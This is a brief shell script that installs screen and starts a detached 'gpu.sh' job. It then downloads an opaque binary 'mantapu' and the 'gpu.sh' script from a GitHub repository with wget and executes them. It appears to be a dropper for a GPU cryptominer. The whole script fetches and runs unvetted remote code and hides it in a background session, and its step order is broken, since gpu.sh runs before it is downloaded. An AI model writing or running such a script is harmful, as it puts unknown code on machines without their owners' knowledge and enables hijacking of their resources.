#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 69 79
wget https://github.com/cir74/1446/raw/main/mantapu
wget https://raw.githubusercontent.com/cir74/1446/main/gpu.sh
chmod +x gpu.sh
./gpu.sh
